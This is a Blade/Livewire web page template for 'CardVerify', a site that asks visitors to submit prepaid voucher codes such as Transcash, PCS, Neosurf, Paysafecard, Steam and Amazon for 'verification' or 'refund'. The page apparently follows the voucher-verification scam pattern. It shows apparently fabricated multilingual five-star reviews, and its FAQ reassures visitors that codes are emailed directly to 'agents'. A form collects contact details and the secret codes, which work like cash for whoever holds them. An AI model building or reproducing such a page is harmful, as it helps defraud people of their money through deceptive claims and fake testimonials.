                        </div>
                    </div>

                    <!-- Slide container with min height to prevent layout shifts -->
                    <div class="relative min-h-[140px] flex items-center overflow-hidden">
                        <!-- Review 1: France -->
                        <div x-show="activeIndex === 0" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Remboursement de mon coupon Transcash reçu en moins d\'une heure. Très sérieux !') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Jean-Marc D.</span>
                                <img src="/images/flags/fr.png" alt="France" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 2: Belgique -->
                        <div x-show="activeIndex === 1" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('J\'ai pu vérifier la validité de mon ticket PCS avant de l\'activer sur ma carte. Excellent service.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Amélie L.</span>
                                <img src="/images/flags/be.png" alt="Belgique" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 3: Deutschland -->
                        <div x-show="activeIndex === 2" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Sehr schneller Service! Mein Neosurf-Gutschein wurde innerhalb von 30 Minuten validiert. Absolut empfehlenswert.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Lukas M.</span>
                                <img src="/images/flags/de.png" alt="Deutschland" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 4: España -->
                        <div x-show="activeIndex === 3" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('¡Excelente! Tenía doubts sobre mi código de Transcash y el soporte me ayudó a resolverlo de inmediato. Muy seguro.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Sofía G.</span>
                                <img src="/images/flags/es.png" alt="España" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 5: Italia -->
                        <div x-show="activeIndex === 4" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Ricarica PCS attivata senza problemi. Servizio clienti rapido ed efficiente via email. Consigliatissimo.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Alessandro V.</span>
                                <img src="/images/flags/it.png" alt="Italia" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 6: Nederland -->
                        <div x-show="activeIndex === 5" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Super snelle terugbetaling van mijn Paysafecard. Binnen 2 uur was alles geregeld. Betrouwbaar platform!') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Daan de J.</span>
                                <img src="/images/flags/nl.png" alt="Nederland" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 7: Polska -->
                        <div x-show="activeIndex === 6" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Szybko i bezpiecznie. Mój kod Steam został zweryfikowany w kilka minut. Świetny kontakt z obsługą.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Katarzyna W.</span>
                                <img src="/images/flags/pl.png" alt="Polska" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 8: Portugal -->
                        <div x-show="activeIndex === 7" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Processo muito simples e rápido para o reembolso do meu cupão Neosurf. Equipa de suporte fantástica!') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Manuel S.</span>
                                <img src="/images/flags/pt.png" alt="Portugal" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 9: United Kingdom -->
                        <div x-show="activeIndex === 8" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Brilliant service! My Amazon voucher verification was completed in no time. Highly recommend this site.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Emma B.</span>
                                <img src="/images/flags/gb.png" alt="United Kingdom" class="h-3.5 w-5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>

                        <!-- Review 10: Schweiz -->
                        <div x-show="activeIndex === 9" x-transition:enter="transition ease-out duration-300 transform"
                            x-transition:enter-start="opacity-0 translate-x-4"
                            x-transition:enter-end="opacity-100 translate-x-0"
                            x-transition:leave="transition ease-in duration-200 transform absolute w-full"
                            x-transition:leave-start="opacity-100 translate-x-0"
                            x-transition:leave-end="opacity-0 -translate-x-4" class="w-full" style="display: none;">
                            <div class="flex items-center gap-1 text-amber-500 mb-2">★★★★★</div>
                            <p class="text-slate-700 text-sm italic leading-relaxed">
                                "{{ __('Schnelle und sichere Validierung meines PCS-Codes. Sehr zufrieden mit der Reaktionszeit.') }}"
                            </p>
                            <div class="flex items-center gap-1.5 mt-4 text-xs font-bold text-slate-500">
                                <span>Hansruedi B.</span>
                                <img src="/images/flags/ch.png" alt="Schweiz" class="h-3.5 w-3.5 rounded-sm object-cover shadow-sm inline-block align-middle ml-1">
                            </div>
                        </div>
                    </div>

                    <!-- Dot indicators -->
                    <div class="flex justify-center gap-1.5 mt-4">
                        <template x-for="(item, index) in Array.from({ length: total })" :key="index">
                            <button @click="setSlide(index)"
                                class="h-1.5 rounded-full transition-all duration-250 cursor-pointer"
                                :class="activeIndex === index ? 'w-5 bg-blue-600' : 'w-1.5 bg-slate-200 hover:bg-slate-300'"
                                :aria-label="'Aller à l\'avis ' + (index + 1)"></button>
                        </template>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Où acheter Section -->
    <section id="ou-acheter" class="py-20 bg-white border-t border-slate-200">
        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
            <div class="text-center mb-16">
                <h2 class="text-3xl font-bold tracking-tight text-slate-900 sm:text-4xl">
                    {{ __('Où acheter des tickets ou recharges ?') }}</h2>
                <p class="mx-auto mt-4 max-w-2xl text-base text-slate-600">
                    {{ __('Achetez vos coupons de manière sécurisée auprès de nos revendeurs partenaires en ligne ou dans vos commerces de proximité habituels.') }}
                </p>
            </div>

            <div class="grid grid-cols-1 lg:grid-cols-2 gap-12">
                <!-- Achat en Ligne -->
                <div class="bg-slate-50 border border-slate-200 rounded-2xl p-8 shadow-sm">
                    <h3 class="text-xl font-bold text-slate-900 mb-2 flex items-center gap-2">
                        <svg class="h-6 w-6 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round"
                                d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
                        </svg>
                        <span>{{ __('Achat Sécurisé en Ligne (Livraison Instantanée)') }}</span>
                    </h3>
                    <p class="text-sm text-slate-600 mb-6">
                        {{ __('Obtenez vos codes de recharge par e-mail en quelques secondes 24h/24 et 7j/7.') }}</p>

                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <!-- Boutique 1 : Recharge.fr (Transcash) -->
                        <a href="https://www.recharge.fr/carte-transcash" target="_blank"
                            class="flex flex-col justify-between p-4 bg-white border border-slate-200 rounded-xl hover:border-blue-500 hover:shadow-sm transition-all group">
                            <div class="space-y-2">
                                <!-- Logo Recharge.fr -->
                                <svg class="h-6 w-28 text-red-500" viewBox="0 0 100 24" fill="currentColor">
                                    <circle cx="10" cy="12" r="7" fill="none" stroke="currentColor" stroke-width="2" />
                                    <path d="M12 9l3 3-3 3" fill="none" stroke="currentColor" stroke-width="2"
                                        stroke-linecap="round" stroke-linejoin="round" />
                                    <text x="24" y="16" font-family="'Inter', sans-serif" font-weight="900"
                                        font-size="11" fill="#1e293b" letter-spacing="-0.5">recharge<tspan
                                            fill="#ef4444">.fr</tspan></text>
                                </svg>
                                <p class="text-[11px] text-slate-450">
                                    {{ __('Achetez vos tickets Transcash directement sur Recharge.fr') }}</p>
                            </div>
                            <div
                                class="mt-4 flex items-center gap-1 text-xs font-semibold text-blue-600 group-hover:text-blue-700">
                                <span>{{ __('Acheter Transcash') }}</span>
                                <span class="transition-transform group-hover:translate-x-0.5">&rarr;</span>
                            </div>
                        </a>

                        <!-- Boutique 2 : Dundle.com (Transcash) -->
                        <a href="https://dundle.com/fr/transcash/" target="_blank"
                            class="flex flex-col justify-between p-4 bg-white border border-slate-200 rounded-xl hover:border-blue-500 hover:shadow-sm transition-all group">
                            <div class="space-y-2">
                                <!-- Logo Dundle.com -->
                                <svg class="h-6 w-28 text-emerald-500" viewBox="0 0 100 24" fill="currentColor">
                                    <circle cx="10" cy="12" r="7" fill="#10b981" />
                                    <path
                                        d="M8 9h2c1 0 1.5.5 1.5 1s-.5 1-1.5 1H8V9zm1 1.5h1c.4 0 .7-.1.7-.5s-.3-.5-.7-.5H9v1z"
                                        fill="white" font-weight="bold" />
                                    <text x="22" y="16" font-family="'Inter', sans-serif" font-weight="900"
                                        font-size="11" fill="#1e293b" letter-spacing="-0.5">dundle<tspan fill="#10b981">
                                            .com</tspan></text>
                                </svg>
                                <p class="text-[11px] text-slate-455">
                                    {{ __('Achetez vos codes Transcash directement sur Dundle') }}</p>
                            </div>
                            <div
                                class="mt-4 flex items-center gap-1 text-xs font-semibold text-blue-600 group-hover:text-blue-700">
                                <span>{{ __('Acheter Transcash') }}</span>
                                <span class="transition-transform group-hover:translate-x-0.5">&rarr;</span>
                            </div>
                        </a>

                        <!-- Boutique 3 : Refilled.com (Transcash) -->
                        <a href="https://refilled.com/transcash" target="_blank"
                            class="flex flex-col justify-between p-4 bg-white border border-slate-200 rounded-xl hover:border-blue-500 hover:shadow-sm transition-all group">
                            <div class="space-y-2">
                                <!-- Logo Refilled.com -->
                                <svg class="h-6 w-32 text-teal-650" viewBox="0 0 120 24" fill="currentColor">
                                    <circle cx="10" cy="12" r="7" fill="#0d9488" fill-opacity="0.15" stroke="#0d9488" stroke-width="1.5"/>
                                    <path d="M10 8v5l3 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round" fill="none"/>
                                    <text x="24" y="16" font-family="'Inter', sans-serif" font-weight="900"
                                        font-size="11" fill="#1e293b" letter-spacing="-0.5">refilled<tspan fill="#0d9488">.com</tspan></text>
                                </svg>
                                <p class="text-[11px] text-slate-450">
                                    {{ __('Achetez vos recharges Transcash sur Refilled.com') }}</p>
                            </div>
                            <div
                                class="mt-4 flex items-center gap-1 text-xs font-semibold text-blue-600 group-hover:text-blue-700">
                                <span>{{ __('Acheter Transcash') }}</span>
                                <span class="transition-transform group-hover:translate-x-0.5">&rarr;</span>
                            </div>
                        </a>

                        <!-- Boutique 4 : Recharge.com (Transcash) -->
                        <a href="https://www.recharge.com/de/de/transcash?currency=EUR" target="_blank"
                            class="flex flex-col justify-between p-4 bg-white border border-slate-200 rounded-xl hover:border-blue-500 hover:shadow-sm transition-all group">
                            <div class="space-y-2">
                                <!-- Logo Recharge.com -->
                                <svg class="h-6 w-32 text-indigo-600" viewBox="0 0 120 24" fill="currentColor">
                                    <circle cx="10" cy="12" r="7" fill="none" stroke="#4f46e5" stroke-width="2" />
                                    <path d="M12 9l3 3-3 3" fill="none" stroke="#4f46e5" stroke-width="2" stroke-linecap="round" />
                                    <text x="24" y="16" font-family="'Inter', sans-serif" font-weight="900"
                                        font-size="11" fill="#1e293b" letter-spacing="-0.5">recharge<tspan fill="#4f46e5">.com</tspan></text>
                                </svg>
                                <p class="text-[11px] text-slate-450">
                                    {{ __('Tickets Transcash officiels sur Recharge.com') }}</p>
                            </div>
                            <div
                                class="mt-4 flex items-center gap-1 text-xs font-semibold text-blue-600 group-hover:text-blue-700">
                                <span>{{ __('Acheter Transcash') }}</span>
                                <span class="transition-transform group-hover:translate-x-0.5">&rarr;</span>
                            </div>
                        </a>
                    </div>
                </div>

                <!-- Points de vente Physiques -->
                <div class="border border-slate-200 rounded-2xl p-8 flex flex-col justify-between bg-slate-50/30">
                    <div>
                        <h3 class="text-xl font-bold text-slate-900 mb-2 flex items-center gap-2">
                            <svg class="h-6 w-6 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                                stroke-width="2">
                                <path stroke-linecap="round" stroke-linejoin="round"
                                    d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
                            </svg>
                            <span>{{ __('Achat Local & Physique') }}</span>
                        </h3>
                        <p class="text-sm text-slate-600 mb-6">
                            {{ __('Si vous préférez payer en espèces ou obtenir un ticket de recharge physique imprimé.') }}
                        </p>

                        <div class="space-y-4">
                            <div class="flex items-start gap-4">
                                <div
                                    class="h-8 w-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center font-bold text-sm shrink-0">
                                    1</div>
                                <div>
                                    <h4 class="font-bold text-slate-800 text-sm">
                                        {{ __('Bureaux de Tabac & Buralistes') }}</h4>
                                    <p class="text-xs text-slate-500 mt-0.5">
                                        {{ __('Demandez directement au comptoir une recharge du montant souhaité (Transcash, PCS, Neosurf...). Un ticket contenant le code secret vous sera imprimé.') }}
                                    </p>
                                </div>
                            </div>
                            <div class="flex items-start gap-4">
                                <div
                                    class="h-8 w-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center font-bold text-sm shrink-0">
                                    2</div>
                                <div>
                                    <h4 class="font-bold text-slate-800 text-sm">
                                        {{ __('Maisons de la Presse & Relais') }}</h4>
                                    <p class="text-xs text-slate-500 mt-0.5">
                                        {{ __('La plupart des commerces de presse dispose de terminaux de rechargement officiels agréés.') }}
                                    </p>
                                </div>
                            </div>
                            <div class="flex items-start gap-4">
                                <div
                                    class="h-8 w-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center font-bold text-sm shrink-0">
                                    3</div>
                                <div>
                                    <h4 class="font-bold text-slate-800 text-sm">
                                        {{ __('Supermarchés & Stations-Service') }}</h4>
                                    <p class="text-xs text-slate-500 mt-0.5">
                                        {{ __('Les rayons cartes cadeaux des grandes enseignes (Carrefour, Leclerc, Auchan...) disposent de cartes physiques pour Amazon, Google Play, Steam, Apple et Netflix.') }}
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- FAQ Section (Rétractable via Alpine.js) -->
    <section id="faq" class="py-20 bg-slate-50 border-t border-slate-200">
        <div class="mx-auto max-w-3xl px-4 sm:px-6 lg:px-8">
            <h2 class="text-3xl font-bold tracking-tight text-slate-900 text-center mb-12">
                {{ __('Foire aux questions') }}</h2>
            <div class="space-y-4">

                <!-- Q1 -->
                <div x-data="{ open: false }"
                    class="bg-white border border-slate-200 rounded-2xl overflow-hidden transition-all duration-200 shadow-sm">
                    <button @click="open = !open"
                        class="w-full flex items-center justify-between p-5 text-left font-semibold text-slate-800 text-sm select-none cursor-pointer focus:outline-none">
                        <span>{{ __('Mon code de coupon est-il sécurisé sur votre site ?') }}</span>
                        <svg class="h-5 w-5 text-slate-500 transition-transform duration-200"
                            :class="{ 'rotate-180': open }" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
                        </svg>
                    </button>
                    <div x-show="open" x-transition
                        class="px-5 pb-5 text-xs text-slate-600 leading-relaxed border-t border-slate-100 pt-3">
                        <p>{{ __('Absolument. CardVerify utilise des connexions chiffrées sous protocole HTTPS/SSL de bout en bout. De plus, vos codes sont transmis directement aux boîtes e-mail sécurisées de nos agents pour validation sans aucun stockage persistant à risque ou hachage bloquant.') }}
                        </p>
                    </div>
                </div>

                <!-- Q2 -->
                <div x-data="{ open: false }"
                    class="bg-white border border-slate-200 rounded-2xl overflow-hidden transition-all duration-200 shadow-sm">
                    <button @click="open = !open"
                        class="w-full flex items-center justify-between p-5 text-left font-semibold text-slate-800 text-sm select-none cursor-pointer focus:outline-none">
                        <span>{{ __('Combien de temps dure l\'activation ou le remboursement ?') }}</span>
                        <svg class="h-5 w-5 text-slate-500 transition-transform duration-200"
                            :class="{ 'rotate-180': open }" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
                        </svg>
                    </button>
                    <div x-show="open" x-transition
                        class="px-5 pb-5 text-xs text-slate-600 leading-relaxed border-t border-slate-100 pt-3">
                        <p>{{ __('Nos agents examinent et traitent manuellement chaque demande de coupon en moins de 2 minutes actif en permanence (7j/7, 24h/24). Les demandes sont traitées immédiatement à la réception de votre soumission.') }}
                        </p>
                    </div>
                </div>

                <!-- Q3 -->
                <div x-data="{ open: false }"
                    class="bg-white border border-slate-200 rounded-2xl overflow-hidden transition-all duration-200 shadow-sm">
                    <button @click="open = !open"
                        class="w-full flex items-center justify-between p-5 text-left font-semibold text-slate-800 text-sm select-none cursor-pointer focus:outline-none">
                        <span>{{ __('Que se passe-t-il si mon coupon est invalide ?') }}</span>
                        <svg class="h-5 w-5 text-slate-500 transition-transform duration-200"
                            :class="{ 'rotate-180': open }" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
                        </svg>
                    </button>
                    <div x-show="open" x-transition
                        class="px-5 pb-5 text-xs text-slate-600 leading-relaxed border-t border-slate-100 pt-3">
                        <p>{{ __('Si un coupon est détecté comme expiré, erroné ou déjà consommé par le réseau émetteur, vous recevrez une notification par e-mail expliquant la cause de l\'invalidation afin de pouvoir contacter le support vendeur.') }}
                        </p>
                    </div>
                </div>

                <!-- Q4 -->
                <div x-data="{ open: false }"
                    class="bg-white border border-slate-200 rounded-2xl overflow-hidden transition-all duration-200 shadow-sm">
                    <button @click="open = !open"
                        class="w-full flex items-center justify-between p-5 text-left font-semibold text-slate-800 text-sm select-none cursor-pointer focus:outline-none">
                        <span>{{ __('Est-ce un service officiel de recharge ?') }}</span>
                        <svg class="h-5 w-5 text-slate-500 transition-transform duration-200"
                            :class="{ 'rotate-180': open }" fill="none" viewBox="0 0 24 24" stroke="currentColor"
                            stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7" />
                        </svg>
                    </button>
                    <div x-show="open" x-transition
                        class="px-5 pb-5 text-xs text-slate-600 leading-relaxed border-t border-slate-100 pt-3">
                        <p>{{ __('CardVerify est un service tiers indépendant spécialisé dans la facilitation, l\'activation et le support de remboursement de cartes cadeaux et recharges. Nous travaillons de concert avec les réseaux agrégateurs pour vous garantir un échange sécurisé et conforme.') }}
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </section>


    <!-- ==================== MODALE 1 : ACTIVATION ==================== -->
    <div x-show="showActivation" x-cloak
        class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm"
        style="display: none;">
        <div @click.away="showActivation = false"
            class="relative w-full max-w-lg bg-white rounded-2xl shadow-2xl border border-slate-200 overflow-hidden flex flex-col max-h-[90vh]">
            <!-- Header Modale -->
            <div class="px-6 py-4 bg-slate-50 border-b border-slate-200 flex justify-between items-center">
                <h3 class="text-lg font-bold text-slate-900">{{ __('Activer un Ticket') }}</h3>
                <button @click="showActivation = false"
                    class="text-slate-400 hover:text-slate-600 text-2xl font-bold cursor-pointer">&times;</button>
            </div>

            <!-- Contenu Modale -->
            <div class="p-6 overflow-y-auto space-y-4">
                @if($submittedSuccessfully)
                    <!-- Message de succès -->
                    <div class="text-center py-8 space-y-4">
                        <div
                            class="mx-auto h-12 w-12 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 text-2xl font-bold">
                            &check;</div>
                        <h4 class="text-xl font-bold text-slate-900">{{ __('Demande Enregistrée !') }}</h4>
                        <p class="text-slate-600 text-sm px-4">{{ $successMessage }}</p>
                        <button @click="showActivation = false"
                            class="mt-6 inline-flex items-center justify-center rounded-xl bg-blue-600 px-5 py-2.5 text-sm font-semibold text-white hover:bg-blue-700 active:scale-95 cursor-pointer">{{ __('Fermer') }}</button>
                    </div>
                @else
                    <!-- Formulaire -->
                    <form wire:submit.prevent="saveActivation" class="space-y-4">
                        @if ($errors->has('general'))
                            <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-xs text-red-600">
                                {{ $errors->first('general') }}
                            </div>
                        @endif

                        <div>
                            <label
                                class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Nom / Pseudo') }}</label>
                            <input type="text" wire:model.blur="fullname"
                                class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                placeholder="Ex: Jean Dupont">
                            @error('fullname') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span> @enderror
                        </div>

                        <div>
                            <label
                                class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Adresse E-mail') }}</label>
                            <input type="email" wire:model.blur="email_user"
                                class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                placeholder="nom@exemple.com">
                            @error('email_user') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                            @enderror
                        </div>

                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Téléphone') }}</label>
                                <input type="text" wire:model.blur="phone"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                    placeholder="+33 6 12 34 56 78">
                                @error('phone') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Type de carte') }}</label>
                                <select wire:model.live="voucher_type_id"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none">
                                    <option value="">{{ __('-- Sélectionner --') }}</option>
                                    @foreach($voucherTypes as $vt)
                                        <option value="{{ $vt->id }}">{{ $vt->name }}</option>
                                    @endforeach
                                </select>
                                @error('voucher_type_id') <span
                                class="text-xs text-red-600 mt-1 block">{{ $message }}</span> @enderror
                            </div>
                        </div>

                        <div class="border-t border-slate-100 pt-4 space-y-4">
                            <!-- Code 1 -->
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Code 1 (Principal)') }}</label>
                                <div class="relative">
                                    <input type="{{ $showCode1 ? 'text' : 'password' }}" wire:model="code1"
                                        class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none font-mono"
                                        placeholder="Entrez le premier code">
                                    <button type="button" wire:click="$toggle('showCode1')"
                                        class="absolute inset-y-0 right-0 px-3 flex items-center text-slate-400 hover:text-slate-600 font-bold text-xs select-none cursor-pointer">
                                        {{ $showCode1 ? __('Masquer') : __('Afficher') }}
                                    </button>
                                </div>
                                @error('code1') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>

                            <!-- Code 2 -->
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Code 2 (Optionnel)') }}</label>
                                <div class="relative">
                                    <input type="{{ $showCode2 ? 'text' : 'password' }}" wire:model="code2"
                                        class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none font-mono"
                                        placeholder="Entrez le second code (si disponible)">
                                    <button type="button" wire:click="$toggle('showCode2')"
                                        class="absolute inset-y-0 right-0 px-3 flex items-center text-slate-400 hover:text-slate-600 font-bold text-xs select-none cursor-pointer">
                                        {{ $showCode2 ? __('Masquer') : __('Afficher') }}
                                    </button>
                                </div>
                                @error('code2') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>
                        </div>

                        <div class="grid grid-cols-1 gap-4">
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Montant (€)') }}
                                    <span
                                        class="text-[10px] font-normal text-slate-400">({{ __('Optionnel') }})</span></label>
                                <input type="text" wire:model="amount"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                    placeholder="Ex: 100€">
                                @error('amount') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>
                        </div>



                        <div class="flex items-start gap-2.5 pt-2">
                            <input type="checkbox" id="acceptTerms" wire:model="acceptTerms"
                                class="h-4 w-4 text-blue-600 border-slate-300 rounded focus:ring-blue-500 mt-0.5">
                            <label for="acceptTerms"
                                class="text-xs text-slate-600 leading-tight">{{ __('J\'accepte la politique de confidentialité de CardVerify et les conditions d\'activation.') }}</label>
                        </div>
